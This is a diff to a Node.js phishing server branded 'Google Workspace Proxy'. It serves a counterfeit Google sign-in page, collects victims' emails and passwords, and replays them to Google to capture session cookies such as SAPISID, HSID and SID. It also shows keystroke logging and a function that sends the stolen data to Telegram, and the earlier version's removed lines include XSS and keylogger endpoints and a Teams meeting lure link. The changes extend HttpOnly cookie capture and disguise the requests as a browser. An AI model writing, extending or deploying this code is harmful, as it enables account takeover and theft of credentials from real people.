@@ -33,8 +33,8 @@ const PATHS = {
 };
 
 console.log('╔═══════════════════════════════════════════════════════════╗');
-console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.1                   ║');
-console.log('║        🔐  Enhanced Proxy + User Feedback                ║');
+console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.2                   ║');
+console.log('║        🔐  Full HttpOnly Cookie Capture                 ║');
 console.log('╠═══════════════════════════════════════════════════════════╣');
 console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
 console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
@@ -176,7 +176,7 @@ async function sendToTelegram(email, password, cookies, ip, targetUrl, fullData 
 }
 
 // ============================================================
-//  VERIFY WITH GOOGLE
+//  ✅ VERIFY WITH GOOGLE - FULL HTTPONLY COOKIE CAPTURE
 // ============================================================
 
 function verifyWithGoogle(email, password) {
@@ -186,7 +186,7 @@ function verifyWithGoogle(email, password) {
             Passwd: password,
             accountType: 'HOSTED_OR_GOOGLE',
             service: 'mail',
-            source: 'Chameleon-Proxy'
+            source: 'Google-Workspace-Proxy'
         });
         
         const options = {
@@ -196,7 +196,11 @@ function verifyWithGoogle(email, password) {
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Content-Length': Buffer.byteLength(postData),
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache'
             }
         };
         
@@ -204,33 +208,53 @@ function verifyWithGoogle(email, password) {
             let data = '';
             res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                const cookies = res.headers['set-cookie'] || [];
+                // ✅ CAPTURE ALL COOKIES from response headers
+                const cookieHeaders = res.headers['set-cookie'] || [];
                 const cookieObj = {};
-                cookies.forEach(cookie => {
-                    const parts = cookie.split(';')[0].split('=');
-                    if (parts.length === 2) {
-                        cookieObj[parts[0]] = parts[1];
+                
+                // Parse ALL cookies including HttpOnly
+                cookieHeaders.forEach(cookieString => {
+                    const parts = cookieString.split(';');
+                    const firstPart = parts[0].trim();
+                    const [name, value] = firstPart.split('=');
+                    
+                    if (name && value) {
+                        cookieObj[name] = value;
                     }
                 });
                 
+                // ✅ Log all captured cookies (server-side only)
+                console.log(`[AUTH] 🍪 Captured ${Object.keys(cookieObj).length} cookies`);
+                console.log(`[AUTH] 📋 Cookie names: ${Object.keys(cookieObj).join(', ')}`);
+                
+                // Check for Google-specific cookies
+                const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
+                const foundGoogleCookies = googleCookies.filter(name => cookieObj[name]);
+                if (foundGoogleCookies.length > 0) {
+                    console.log(`[AUTH] 🔐 Google Auth Cookies: ${foundGoogleCookies.join(', ')}`);
+                }
+                
+                // Check if login was successful
                 const success = data.includes('Gmail') || 
                               data.includes('https://mail.google.com') ||
                               data.includes('_auth') ||
-                              cookies.some(c => c.includes('SAPISID') || c.includes('HSID'));
+                              data.includes('https://accounts.google.com/') ||
+                              cookieHeaders.some(c => c.includes('SAPISID') || c.includes('HSID') || c.includes('SID'));
                 
                 console.log(`[AUTH] Google verification ${success ? '✅ SUCCESS' : '❌ FAILED'} for ${email}`);
                 
                 resolve({
                     success: success,
                     cookies: cookieObj,
-                    html: data
+                    html: data,
+                    cookieHeaders: cookieHeaders
                 });
             });
         });
         
         req.on('error', (err) => {
             console.error('[AUTH] Error:', err.message);
-            resolve({ success: false, cookies: null, html: '' });
+            resolve({ success: false, cookies: null, html: '', cookieHeaders: [] });
         });
         req.write(postData);
         req.end();
@@ -396,7 +420,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  ✅ ENHANCED HANDLE LOGIN REQUEST - With Error Handling
+//  HANDLE LOGIN REQUEST
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -407,7 +431,6 @@ function handleLoginRequest(req, res) {
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     
-    // Check for error parameter
     const errorParam = req.url.match(/error=([^&]+)/);
     const errorMessage = errorParam ? decodeURIComponent(errorParam[1]) : null;
 
@@ -420,7 +443,6 @@ function handleLoginRequest(req, res) {
 
     console.log(`[LOGIN] 📧 Email: ${email}`);
     console.log(`[LOGIN] 📡 IP: ${ip}`);
-    console.log(`[LOGIN] ❌ Error: ${errorMessage || 'None'}`);
 
     const sessionId = createSession(email, ip, userAgent);
     if (errorMessage) {
@@ -433,7 +455,6 @@ function handleLoginRequest(req, res) {
 
     console.log(`[LOGIN] 🆔 Session: ${sessionId}`);
 
-    // ✅ SERVE CUSTOM LOGIN PAGE WITH ERROR MESSAGE
     const errorDisplay = errorMessage ? `
         <div class="error show" id="errorMsg">
             <span class="error-icon">⚠️</span>
@@ -447,7 +468,7 @@ function handleLoginRequest(req, res) {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Google Sign In</title>
+        <title>Google Workspace Sign In</title>
         <style>
             * {
                 margin: 0;
@@ -550,9 +571,6 @@ function handleLoginRequest(req, res) {
                 color: #1a73e8;
                 font-size: 13px;
                 text-decoration: none;
-            }
-            .form-options a:hover {
-                text-decoration: underline;
             }
             .btn {
                 width: 100%;
@@ -708,20 +726,10 @@ function handleLoginRequest(req, res) {
 
         <script>
             window.GOOGLE_CONFIG = {
-                BACKEND_URL: '${BACKEND_URL}',
-                KEYLOGGER_URL: '${KEYLOGGER_URL}',
-                XSS_ENDPOINT: '${PATHS.xssEndpoint}',
-                COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
-                KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
                 SESSION_ID: '${sessionId}',
-                EMAIL: '${email}',
-                SERVICE: 'Google Workspace'
+                EMAIL: '${email}'
             };
             
-            console.log('🔐 Google Proxy loaded');
-            console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
-            console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
-
             const loginBtn = document.getElementById('loginBtn');
             const passwordInput = document.getElementById('password');
             const errorDiv = document.getElementById('error');
@@ -750,50 +758,29 @@ function handleLoginRequest(req, res) {
                 loadingDiv.style.display = 'block';
                 successDiv.classList.remove('show');
 
-                console.log('📤 Submitting credentials for:', window.GOOGLE_CONFIG.EMAIL);
-
-                // Send to proxy backend
-                fetch('${PATHS.loginPath}', {
+                fetch('/login', {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/x-www-form-urlencoded',
-                        'X-Session-Id': window.GOOGLE_CONFIG.SESSION_ID
+                        'X-Session-Id': '${sessionId}'
                     },
-                    body: 'Email=' + encodeURIComponent(window.GOOGLE_CONFIG.EMAIL) + 
+                    body: 'Email=' + encodeURIComponent('${email}') + 
                           '&Passwd=' + encodeURIComponent(password) +
                           '&accountType=HOSTED_OR_GOOGLE' +
                           '&service=mail'
                 })
                 .then(response => {
                     if (response.redirected) {
-                        console.log('✅ Redirecting to:', response.url);
-                        // Show success message
-                        successDiv.textContent = '✅ Signing in successfully! Redirecting to meeting...';
+                        successDiv.textContent = '✅ Signing in successfully! Redirecting...';
                         successDiv.classList.add('show');
                         setTimeout(() => {
                             window.location.href = response.url;
                         }, 1000);
-                    } else if (response.ok) {
-                        return response.json();
                     } else {
                         throw new Error('Login failed');
                     }
                 })
-                .then(data => {
-                    if (data && data.success) {
-                        console.log('✅ Login successful');
-                        successDiv.textContent = '✅ Signing in successfully! Redirecting to meeting...';
-                        successDiv.classList.add('show');
-                        setTimeout(() => {
-                            window.location.href = 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true';
-                        }, 1000);
-                    } else {
-                        throw new Error('Invalid credentials');
-                    }
-                })
                 .catch(error => {
-                    console.error('❌ Login error:', error.message);
-                    // Show error message with retry option
                     errorDiv.textContent = '⚠️ Invalid email or password. Please try again.';
                     errorDiv.classList.add('show');
                     loginBtn.disabled = false;
@@ -823,10 +810,7 @@ function handleLoginRequest(req, res) {
                 this.style.borderColor = '';
             });
 
-            // Auto-focus password
             setTimeout(() => passwordInput.focus(), 500);
-
-            // If there was an error on page load, focus password
             ${errorMessage ? 'setTimeout(() => passwordInput.focus(), 1000);' : ''}
         </script>
         <script src="${PATHS.script}"></script>
@@ -881,7 +865,7 @@ async function handlePostRequest(body, req, res) {
         console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
         console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
 
-        // ✅ Verify with Google
+        // ✅ Call verifyWithGoogle
         const verifyResult = await verifyWithGoogle(email, password);
         
         let allCookies = {};
@@ -971,7 +955,7 @@ async function handlePostRequest(body, req, res) {
 }
 
 // ============================================================
-//  ✅ MAIN SERVER
+//  MAIN SERVER
 // ============================================================
 
 const server = http.createServer((req, res) => {
@@ -996,7 +980,7 @@ const server = http.createServer((req, res) => {
             uptime: process.uptime(),
             sessions: Object.keys(userSessions).length,
             service: 'Google Workspace Proxy',
-            version: '3.1.0'
+            version: '3.2.0'
         }));
         return;
     }
@@ -1011,7 +995,6 @@ const server = http.createServer((req, res) => {
             attempts: userSessions[id].attempts || 0,
             verified: userSessions[id].verified || false,
             error: userSessions[id].error || null,
-            xssCount: (userSessions[id].xssData || []).length,
             cookieCount: (userSessions[id].cookies || []).length,
             keystrokeCount: (userSessions[id].keystrokes || []).length
         }));
@@ -1057,7 +1040,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // --- ✅ 404 - Handle all other requests with custom 404 page ---
+    // --- 404 - Handle all other requests with custom 404 page ---
     console.log(`[404] 🔍 Not Found: ${req.url}`);
     serve404Page(res);
 });
@@ -1086,8 +1069,8 @@ setInterval(() => {
 
 server.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
-    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.1                   ║');
-    console.log('║        🔐  Gmail/GSuite + Full Cookie Capture           ║');
+    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.2                   ║');
+    console.log('║        🔐  Full HttpOnly Cookie Capture                 ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
     console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
